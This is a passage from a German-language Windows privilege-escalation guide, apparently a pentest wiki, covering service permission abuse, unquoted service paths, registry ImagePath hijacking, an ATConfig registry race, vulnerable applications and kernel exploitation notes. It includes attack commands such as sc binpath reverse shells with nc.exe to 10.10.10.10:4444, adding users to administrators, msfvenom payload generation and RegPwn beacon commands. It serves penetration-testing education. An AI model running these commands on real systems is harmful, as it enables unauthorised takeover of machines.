accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Es wird empfohlen zu prüfen, ob „Authenticated Users“ einen Dienst ändern können:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[You can download accesschk.exe for XP from here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn dieser Fehler auftritt (zum Beispiel mit SSDPSRV):

_Systemfehler 1058 ist aufgetreten._\
_Der Dienst kann nicht gestartet werden, da er deaktiviert ist oder keine aktivierten Geräte mit ihm verknüpft sind._

Du kannst ihn aktivieren mit

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Beachten Sie, dass der Dienst upnphost von SSDPSRV abhängt (für XP SP1)**

**Eine weitere Umgehungslösung** für dieses Problem ist die Ausführung von:

```
sc.exe config usosvc start= auto
```

### **Dienst-Binärpfad ändern**

Wenn die Gruppe „Authenticated users“ über **SERVICE_ALL_ACCESS** für einen Dienst verfügt, kann die ausführbare Binärdatei des Dienstes geändert werden. So lässt sich **sc** ändern und ausführen:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Dienst neu starten

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Berechtigungen können durch verschiedene Rechte erweitert werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Dienst-Binärdatei.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen und damit Änderungen an der Dienstkonfiguration.
- **WRITE_OWNER**: Ermöglicht die Übernahme des Besitzes und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Beinhaltet ebenfalls die Möglichkeit, die Dienstkonfiguration zu ändern.
- **GENERIC_ALL**: Beinhaltet ebenfalls die Möglichkeit, die Dienstkonfiguration zu ändern.

Zur Erkennung und Ausnutzung dieser Schwachstelle kann _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen für Dienst-Binärdateien

Wenn ein Dienst als **`LocalSystem`**, **`LocalService`**, **`NetworkService`** oder unter einem privilegierten Domänenkonto ausgeführt wird, aber **Benutzer mit geringen Berechtigungen die Dienst-EXE oder deren übergeordneten Ordner ändern können**, lässt sich der Dienst häufig kapern, indem **die Binärdatei ersetzt und der Dienst neu gestartet wird**.

**Prüfe, ob du die von einem Dienst ausgeführte Binärdatei ändern kannst** oder ob du **Schreibberechtigungen für den Ordner hast**, in dem sich die Binärdatei befindet ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Mit **wmic** (nicht in system32) kannst du alle von einem Dienst ausgeführten Binärdateien ermitteln und deine Berechtigungen mit **icacls** prüfen:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Du kannst auch **sc** und **icacls** verwenden:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Achte auf gefährliche ACLs, die **`Everyone`**, **`BUILTIN\Users`** oder **`Authenticated Users`** gewährt wurden, insbesondere **`(F)`**, **`(M)`** oder **`(W)`** für die ausführbare Dienstdatei oder das Verzeichnis, in dem sie sich befindet. Ein praktischer Missbrauchsablauf sieht so aus:<sup>[[27]](#references)</sup>

1. Ermittle mit `sc qc <service_name>` das Dienstkonto und den Pfad zur ausführbaren Datei.
2. Prüfe mit `icacls <path>`, ob die Binärdatei beschreibbar ist.
3. Ersetze die Dienst-Binärdatei durch ein Payload oder eine gültige schädliche Dienst-Binärdatei.
4. Starte den Dienst mit `sc stop <service_name> && sc start <service_name>` neu (oder warte auf einen Neustart / service trigger).

Nützliche automatisierte Prüfungen:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Wenn der Dienst von einem normalen Benutzer nicht neu gestartet werden kann, prüfe, ob er beim Booten automatisch gestartet wird, eine Fehleraktion hat, die ihn erneut startet, oder indirekt von der Anwendung ausgelöst werden kann, die ihn verwendet.

### Berechtigungen zum Ändern der Dienstregistrierung

Du solltest prüfen, ob du eine Dienstregistrierung ändern kannst.\
Du kannst deine **Berechtigungen** für eine **Dienstregistrierung** folgendermaßen **überprüfen**:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Der ursprüngliche Berechtigungstest lautete:

Es sollte geprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über `FullControl`-Berechtigungen verfügen. Wenn ja, kann die vom Dienst ausgeführte Binärdatei geändert werden.

Prüfe, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über schreibfähige Registrierungsberechtigungen für einen bestimmten Dienstschlüssel verfügen. Ein ACL-Eintrag allein beweist keinen effektiven Zugriff: Deny-Einträge, das aktuelle Token und geerbte Berechtigungen sind ebenfalls relevant. Die Rechte für Registrierungsschlüssel sind unabhängig von den Rechten `SERVICE_CHANGE_CONFIG` und `SERVICE_START` des Dienstobjekts. Für eine Privilegieneskalation sind außerdem ein nutzbares Dienstkonfigurationsfeld, eine Möglichkeit, den Dienst auszulösen, und eine privilegiertere Dienstidentität erforderlich. Siehe Microsofts [Rechte für Registrierungsschlüssel](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) und [Referenz zu Dienstzugriffsrechten](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

So änderst du den Pfad der ausgeführten Binärdatei:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry-Symlink-Race für beliebige HKLM-Wertschreibzugriffe (ATConfig)

Einige Windows-Barrierefreiheitsfunktionen erstellen benutzerspezifische **ATConfig**-Schlüssel, die später von einem **SYSTEM**-Prozess in einen HKLM-Sitzungsschlüssel kopiert werden. Eine Registry-**Symlink-Race** kann diesen privilegierten Schreibvorgang auf einen **beliebigen HKLM-Pfad** umleiten und so primitive Schreibzugriffe auf beliebige HKLM-**Werte** ermöglichen.<sup>[[18]](#references)</sup>

Wichtige Speicherorte (Beispiel: Bildschirmtastatur `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listet installierte Barrierefreiheitsfunktionen auf.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` speichert benutzergesteuerte Konfiguration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` wird bei der Anmeldung und beim Wechsel zum Secure Desktop erstellt und ist für den Benutzer beschreibbar.

Ablauf des Angriffs (CVE-2026-24291 / ATConfig):

1. Lege den **HKCU-ATConfig**-Wert fest, der von SYSTEM geschrieben werden soll.
2. Löse die Kopie auf den Secure Desktop aus (z. B. mit **LockWorkstation**), wodurch der AT-Broker-Ablauf gestartet wird.
3. **Gewinne die Race**, indem du ein **oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` setzt. Sobald das oplock ausgelöst wird, ersetze den **HKLM-Session-ATConfig**-Schlüssel durch einen **Registry-Link** auf ein geschütztes HKLM-Ziel.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald du beliebige HKLM-Werte schreiben kannst, kannst du durch Überschreiben von Dienstkonfigurationswerten zu LPE übergehen:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/Befehlszeile)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wähle einen Dienst, den ein normaler Benutzer starten kann (z. B. **`msiserver`**), und starte ihn nach dem Schreibvorgang. **Hinweis:** Die öffentliche Exploit-Implementierung **sperrt die Workstation** im Rahmen der Race.

Beispiel-Tools (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### AppendData/AddSubdirectory-Berechtigungen für Service-Registrierungsschlüssel

Wenn du diese Berechtigung für einen Registrierungsschlüssel hast, bedeutet das, dass **du darunter Unterschlüssel erstellen kannst**. Bei Windows-Diensten reicht das aus, um **beliebigen Code auszuführen**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jede Zeichenfolge bis zu einem Leerzeichen auszuführen.

Für den Pfad _C:\Program Files\Some Folder\Service.exe_ versucht Windows beispielsweise, Folgendes auszuführen:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Liste alle Unquoted Service Paths auf, ausgenommen jene, die zu integrierten Windows-Diensten gehören:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Diese Schwachstelle kannst du mit metasploit erkennen und ausnutzen:** `exploit/windows/local/trusted\_service\_path` Mit metasploit kannst du manuell eine Service-Binärdatei erstellen:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Wiederherstellungsaktionen

Windows ermöglicht es Benutzern, Aktionen festzulegen, die ausgeführt werden, wenn ein Dienst fehlschlägt. Diese Funktion kann so konfiguriert werden, dass sie auf eine Binärdatei verweist. Wenn diese Binärdatei ersetzt werden kann, ist möglicherweise eine Rechteausweitung möglich. Weitere Details finden Sie in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ziele von Skripten geplanter Aufgaben

Prüfen Sie bei einer aktivierten Aufgabe, die `cmd.exe /c` mit einer `.bat`- oder `.cmd`-Datei ausführt, sowohl das im **Aktionsargument** genannte Skript als auch `cmd.exe`. Dasselbe gilt für ein explizites Dateiargument eines Interpreters, etwa PowerShell `-File`. Wenn eine geplante Batchdatei einen wörtlichen PowerShell-Aufruf mit `-File` enthält, prüfen Sie auch die ACL des referenzierten Skripts; Variablen, Bedingungen und Shell-Verkettungen müssen manuell nachvollzogen werden. Ein Skript oder übergeordnetes Verzeichnis, in das der aufrufende Benutzer schreiben kann, ist nur dann ein Ansatzpunkt für eine kontoübergreifende Ausführung, wenn sich der konfigurierte Aufgabenkontext vom aufrufenden Benutzer unterscheidet und die Aufgabe tatsächlich diese Aktion erreicht. Eine ACL, die nur das Anhängen erlaubt, kann bei Skripten relevant sein; ein früheres `exit` oder ein anderer Kontrollfluss kann angehängte Zeilen jedoch unerreichbar machen. Überprüfen Sie die effektiven ACLs, den [Ausführungskontext der Aufgabe](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), das Arbeitsverzeichnis, den Trigger und die Richtlinie für Anwendungskontrolle, bevor Sie eine Rechteausweitung behaupten. Die Bestandsaufnahme sollte weder das Skript ändern noch die Aufgabe starten.

## Benannte Streams in zugänglichen Dateien

Unter NTFS kann eine lesbare Datei einen benannten `:$DATA`-Stream enthalten, dessen Inhalt bei einer gewöhnlichen Verzeichnisauflistung nicht angezeigt wird. Prüfen Sie bei einer kleinen, relevanten Auswahl zugänglicher Sicherungs- oder Konfigurationsdateien zunächst die Stream-**Namen und -Größen**, bevor Sie Inhalte öffnen. Windows stellt Streams über [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) und PowerShell über [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) bereit. Ein Streamname, der auf ein Geheimnis hindeutet, ist lediglich ein Ansatzpunkt. Prüfen Sie den effektiven Lesezugriff auf die Datei, die Stream-Unterstützung des Dateisystems, ob der Stream verwendbare Zugangsdaten enthält und für welches Konto diese tatsächlich gelten. Vermeiden Sie bei der routinemäßigen Aufzählung rekursive Stream-Scans und die Ausgabe von Stream-Inhalten.

## Hilfsprogrammeingaben des geplanten Windows Driver Kit

Das optionale Windows Driver Kit enthält `StandaloneRunner.exe`, das in seinem Ausführungsverzeichnis die Dateien `command.txt`, `reboot.rsf` und eine Projektdatei `working\rsf.rsf` verarbeiten kann. Eine geplante Aufgabe oder ein Dienst, der dieses Hilfsprogramm mit einem privilegierten Konto startet, kann Schreibzugriff mit geringen Berechtigungen auf diese Eingabedateien in Befehlsausführung im Kontext dieses Kontos umwandeln, selbst wenn die ausführbare Datei des Hilfsprogramms geschützt ist. Stellen Sie fest, ob der privilegierte Prozess die Dateien tatsächlich verarbeitet und ob **beide** Begleitdateien erstellt oder geändert werden können; allein das Auffinden des Hilfsprogramms reicht nicht aus.

Prüfen Sie bei einer geplanten Aufgabe deren [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) in der Aktion sowie die ACLs der beiden Pfade zu den Begleitdateien. Gibt die Aufgabe kein Arbeitsverzeichnis an, ist das Verzeichnis der ausführbaren Datei lediglich ein zu überprüfender Ansatzpunkt und kein Beleg dafür, wo die Aufgabe ihre Eingaben liest. Auch die Voraussetzung für die Projektdatei im Arbeitsverzeichnis muss erfüllt sein. Prüfen Sie das tatsächliche Aufgabenkonto, anstatt anzunehmen, dass die Aufgabe als SYSTEM ausgeführt wird.

## Anwendungen

### Installierte Anwendungen

Prüfen Sie die **Berechtigungen der Binärdateien** (möglicherweise können Sie eine davon überschreiben und Ihre Berechtigungen erweitern) und der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Reparaturpfad des Checkmk-Windows-Agenten

[CVE-2024-0670](https://checkmk.com/werk/16361) betrifft ältere Checkmk-Windows-Agenten, die Befehlsdateien in `C:\Windows\Temp` geschrieben und anschließend eine bereits vorhandene schreibgeschützte Datei ausgeführt haben, wenn das Ersetzen fehlschlug. Der Anbieter hat das Problem in 2.1.0p40, 2.2.0p23, 2.3.0b1 und 2.4.0b1 behoben. Prüfe die vollständige installierte Patch-Version und ob der betroffene Agent-Vorgang ausgeführt werden kann; eine Angabe nur des Zweigs wie `2.1` reicht nicht aus, um eine Gefährdung festzustellen. Bei der Enumeration können Version, Dienststatus und Temp-Berechtigungen geprüft werden, ohne Dateien zu erstellen oder Agent-Befehle auszulösen.

#### Überprüfung des ADSelfService-Plus-SAML-Dienstes

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) betraf ADSelfService Plus Build 6210 und früher; der Anbieter hat das Problem in Build 6211 behoben. Die Schwachstelle ist nur relevant, wenn SAML SSO **aktiviert ist oder war**. Ein Eintrag für ein installiertes Produkt oder ein Dienstpfad ist daher ein Ansatzpunkt, aber kein Nachweis für eine Schwachstelle: Prüfe den genauen Build, den Verlauf der SAML-Konfiguration, die Netzwerk-Erreichbarkeit des Dienstes und das Konto, unter dem er läuft. Codeausführung über den Dienst erfolgt mit den Berechtigungen dieses Kontos; eine Ausführung als SYSTEM setzt voraus, dass die Instanz als SYSTEM läuft. Eine lesbare `OfflineBackup_*.ezip` im Backup-Verzeichnis des Produkts ist ein separater Hinweis auf ein verschlüsseltes Backup, aber kein Nachweis für verwendbare Zugangsdaten oder diese SAML-Schwachstelle. Halte Pfad und Zugriffsrechte fest, ohne die Datei bei der routinemäßigen Enumeration zu entpacken.

#### Jenkins-Controller und Grenzen von Domänenkonten

Unterscheide auf einem Windows-Jenkins-Controller zwischen der Berechtigung, einen Job zu erstellen oder zu konfigurieren, und der Berechtigung, ihn zu starten: [Jenkins beschreibt diese als separate Rechte `Job/Create`, `Job/Configure` und `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ein konfigurierter Zeitplan oder ein Remote-Trigger kann einen weiteren Weg zum Starten eines Builds bieten; prüfe jedoch, ob er aktiviert ist und der Build tatsächlich ausgeführt wird. Die Ausführung erfolgt mit der Identität des Controllers oder des ausgewählten Agents; auf gespeicherte Zugangsdaten kann ein Job nur zugreifen, wenn sie in seinem Geltungsbereich verfügbar sind. Prüfe außerdem den Zugriff auf die Metadaten in `JENKINS_HOME`: Jenkins speichert Zugangsdatenmaterial und Verschlüsselungsschlüssel in `credentials.xml`, `secrets/hudson.util.Secret` und `secrets/master.key` ([Jenkins-Speicherung von Secrets](https://www.jenkins.io/doc/developer/security/secrets/)). Ihr bloßes Vorhandensein gibt kein Passwort preis; prüfe den **Lesezugriff auf die erforderlichen Dateien** und einen davon getrennten Pfad zur Wiederverwendung des Kontos, ohne Secrets in gemeinsam genutzten Ausgaben auszugeben. Verfügt dieses Konto über ein Schreibrecht auf `scriptPath` des AD-Benutzerobjekts, bestätige einen beschreibbaren Skriptpfad und einen tatsächlichen Anmelde- oder geplanten Prozess, der als Zielbenutzer läuft, bevor du dies als kontoübergreifende Ausführung einstufst. Weitere Gruppensteuerung erfordert eine separate Überprüfung der effektiven AD-Rechte.

#### Identität eines selbstgehosteten Azure-Pipelines-Agents

Unterscheide bei einem Azure DevOps Server- oder Azure-Pipelines-Projekt zwischen der Berechtigung, eine Pipeline **zu erstellen oder zu bearbeiten**, und der Berechtigung, sie **in die Warteschlange zu stellen** und den ausgewählten Agent-Pool zu verwenden; [Microsoft dokumentiert Pipeline-Berechtigungen](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) und [Pool-Autorisierung](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) getrennt. Kann ein Konto mit geringeren Berechtigungen einen Skriptschritt einreichen und diese Pipeline auf einem selbstgehosteten Windows-Agent ausführen, wird der Schritt als [konfiguriertes Betriebssystemkonto des Agents](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) ausgeführt. Prüfe die genaue Pipeline, Einschränkungen für Branches und Ressourcen, den autorisierten Pool, den ausführbaren Job und die Dienstidentität des Agents, bevor du einen kontoübergreifenden oder SYSTEM-Übergang behauptest. Ein installierter Agent, eine Projektrolle oder alleiniger Schreibzugriff auf ein Repository sind nur Ansatzpunkte; prüfe Berechtigungen und lokale Dienstmetadaten, ohne bei der passiven Enumeration einen Build zu starten.

#### Anmeldedaten von Microsoft Entra Connect Sync

[Microsoft unterscheidet](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) zwischen dem **ADSync-Dienstkonto**, das den Synchronisierungsdienst ausführt und auf dessen SQL-Datenbank zugreift, und dem **AD-DS-Connector-Konto**, dessen Verzeichnisberechtigungen von den konfigurierten Synchronisierungsfunktionen abhängen. Anmeldedaten des Connectors werden verschlüsselt in dieser Datenbank gespeichert; das Schlüsselmaterial wird [durch DPAPI unter dem ADSync-Dienstkonto geschützt](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Ein installierter Synchronisierungsdienst, eine Gruppe, deren Name auf lokale Administratorrechte hindeutet, oder alleiniger Datenbankzugriff belegen weder entschlüsselbare Anmeldedaten noch eine Rechteausweitung in der Domäne. Prüfe separat die tatsächlichen Datenbank-Leserechte, den Zugriff auf das Dienstkonto und den Schlüssel, das Installations- und SQL-Layout, die konfigurierte Connector-Identität sowie deren effektive AD-Berechtigungen. Bei der routinemäßigen Enumeration sollten nur Dienst- und Zugriffsinformationen angezeigt werden, nicht die gespeicherten Secrets abgefragt oder ausgegeben werden.

#### Berechtigungen für Support-DLLs von Druckertreibern

Ein installierter Druckertreiber kann Support-DLLs unter `C:\ProgramData` ablegen und in einem privilegierteren Druckprozess laden. Prüfe die ACLs des genauen Treiberverzeichnisses und der DLLs, einschließlich übergeordneter Verzeichnisse und Reparse Points, auch wenn die WMI-Enumeration von Druckern verweigert wird. Beim [Problem mit dem Ricoh-Druckertreiber CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) lautete der gemeldete Pfad `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [die ursprüngliche Veröffentlichung](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) beschreibt das Laden von DLLs durch `PrintIsolationHost.exe`. Eine beschreibbare ACL ist nur ein Ansatzpunkt: Prüfe den effektiven Schreibzugriff nach Berücksichtigung von Verweigerungseinträgen, ob der betreffende Treiber installiert ist und die Datei unter einer privilegierten Identität lädt, und ob ein aktualisierter Treiber oder ein Sicherheitsprogramm des Anbieters die Installation behoben hat. Leite eine Schwachstelle nicht allein aus dem Verzeichnisnamen oder der Treiberversion ab.

### Schreibberechtigungen

Prüfe, ob du eine Konfigurationsdatei so ändern kannst, dass du eine geschützte Datei lesen kannst, oder ob du eine Binärdatei ändern kannst, die von einem Administratorkonto ausgeführt wird (schedtasks).

Eine Möglichkeit, schwache Berechtigungen für Ordner und Dateien im System zu finden, ist:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++-Plugin-Autoload-Persistenz/Ausführung

Notepad++ lädt automatisch alle Plugin-DLLs in seinen Unterordnern `plugins`. Wenn eine beschreibbare portable Installation/Kopie vorhanden ist, führt das Ablegen eines bösartigen Plugins bei jedem Start automatisch Code innerhalb von `notepad++.exe` aus (einschließlich über `DllMain` und Plugin-Callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Beim Start ausführen

**Prüfe, ob du einen Registry-Eintrag oder eine Binärdatei überschreiben kannst, die von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **Autoruns-Orte zur Rechteausweitung** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **merkwürdigen/verwundbaren Treibern von Drittanbietern**.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Wenn ein Treiber eine beliebige Kernel-Read/Write-Primitive bereitstellt (häufig bei schlecht entworfenen IOCTL-Handlern), kannst du deine Privilegien erhöhen, indem du direkt aus dem Kernel-Speicher ein SYSTEM-Token stiehlst.<sup>[[13]](#references)</sup> Die Schritt-für-Schritt-Technik findest du hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Verwandtes Material zur Windows-Kernel-Exploitation:

Ein Beispiel für einen Kernel-Mode-Ring-Buffer mit vom Benutzer beschreibbaren Read/Write-Registern findest du in der [USB-MIDI-Variante mit gelooptem Streaming](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Bei Race-Condition-Bugs, bei denen der verwundbare Aufruf einen vom Angreifer kontrollierten Object-Manager-Pfad öffnet, kann eine absichtliche Verlangsamung der Suche (mit Komponenten maximaler Länge oder tief verschachtelten Verzeichnisketten) das Zeitfenster von Mikrosekunden auf mehrere zehn Mikrosekunden verlängern:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAFs in Cancel-safe Queues, Offenlegungen aus dem paged-pool und I/O-Ring-Pivots

Einige Windows-Kernel-LPE-Ketten lassen sich aus zwei für sich genommen wenig schwerwiegenden Bugs aufbauen: einer **Race-Condition in der Lebensdauer einer Cancel-safe Queue**, die eine Anfrage/CBD freigibt, während die Queue-Sperre noch gehalten wird, und einer Offenlegung durch **Freigabe der Sperre vor dem Kopieren**, bei der während `RtlCopyToUser` eine freigegebene paged-pool-Allokation geleakt wird.<sup>[[29]](#references)</sup>

Hinweise zur Analyse und Exploitation:

- **Freigabe unter Sperre + anschließender Abbruch**: Suche nach einem Erfolgspfad mit **Acquire -> CompleteRequest/free -> Release**, während der Abbruchpfad **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** ausführt. Wenn der Erfolgspfad `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` erreicht, bevor die CBDQ/CSQ-Sperre freigegeben wird, kann ein in `NtCancelIoFileEx -> IopCsqCancelRoutine` blockierter Thread später fortgesetzt werden und einen freigegebenen `PFLT_CALLBACK_DATA` an den Remove-Callback des Treibers übergeben.
- **Das freigegebene Queue-Objekt zurückbelegen** mit einer gleich großen, vom Angreifer kontrollierten paged-pool-Allokation. `NPFS` Data Queue Entries sind nützlich, weil sich Payload und Größe kontrollieren lassen und sie sich später mit Pipe-Read-/Peek-Operationen untersuchen lassen. Wenn das freigegebene Objekt List-Links enthält, überschreibe sie mit einer **zyklischen Liste gefälschter Request-Nodes im User-Speicher**, damit der Treiber wiederholt vom Angreifer definierte Request-Strukturen verarbeitet, statt am ursprünglichen Listen-Head anzuhalten.
- **Einen vorhersagbaren Write aufwerten**: Wenn der gefälschte Request einen verschachtelten Context-Pointer umleitet, der von Bookkeeping-Writes verwendet wird (Zeitstempel / QPC / benachbarte Refcount-Felder), erhältst du möglicherweise einen **adresskontrollierten, aber nicht wertkontrollierten** Kernel-Write. Ziele in diesem Fall auf das **length/size**-Feld eines gesprayten Pool-Objekts statt auf einen abschließenden Code-/Daten-Pointer und durchsuche dann den Spray, bis das korrumpierte Objekt einen **Out-of-Bounds-Read aus dem paged-pool** ermöglicht.
- **Muster für racebare Offenlegungen**: Jeder Syscall mit `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ist ein aussichtsreicher Kandidat. Die Zuverlässigkeit steigt, wenn der Angreifer den kopierten Buffer vergrößern kann (etwa durch viele Listen-/Ressourcen-Einträge, die die finale Allokationsgröße eines Serializers erhöhen), denn der längere Kopiervorgang vergrößert das Zeitfenster für den Austausch, ohne zwingend einen Absturz auszulösen.
